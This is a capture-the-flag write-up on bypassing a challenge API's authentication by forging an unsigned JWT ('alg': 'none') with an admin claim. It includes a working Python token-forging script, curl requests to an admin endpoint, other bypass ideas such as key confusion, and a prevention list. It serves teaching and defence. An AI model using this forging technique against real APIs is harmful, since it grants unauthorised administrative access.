# API Authentication Bypass - Writeup

## Challenge Description
This API has weak authentication. Can you bypass it?

## Solution

### Step 1: Analyze the API
```bash
curl -v https://api.challenge.com/secure
```

Response shows weak JWT implementation:
```
Authorization: Bearer eyJhbGciOiJub25lIn0.payload.signature
```

### Step 2: Identify the Weakness
The API accepts `"alg": "none"` in JWT header - no signature verification!

### Step 3: Craft Malicious JWT
```python
import base64
import json

# Header: alg = "none"
header = {
    "alg": "none",
    "typ": "JWT"
}

# Payload: set admin flag
payload = {
    "user": "attacker",
    "admin": True,
    "exp": 9999999999
}

# Encode (no signature needed)
header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

token = f"{header_encoded}.{payload_encoded}."
print(token)
```

### Step 4: Use the Token
```bash
curl -H "Authorization: Bearer TOKEN" https://api.challenge.com/admin
```

## Alternative Bypasses
- **Expired tokens:** Check if expiration is validated
- **Hardcoded secrets:** Try common JWT secrets
- **Key confusion:** Sign with public key as HS256 secret

## Tools
- `jwt.io` - Decode tokens
- `jq` - JSON parsing
- `curl` - API testing

## Flag
`MCTF{JWT_NONE_ALGORITHM_BYPASS}`

## Prevention
- Never use `"alg": "none"`
- Always verify signatures
- Use strong secret keys (32+ bytes)
- Validate expiration times
- Use HTTPS only
- Implement rate limiting
- Log authentication attempts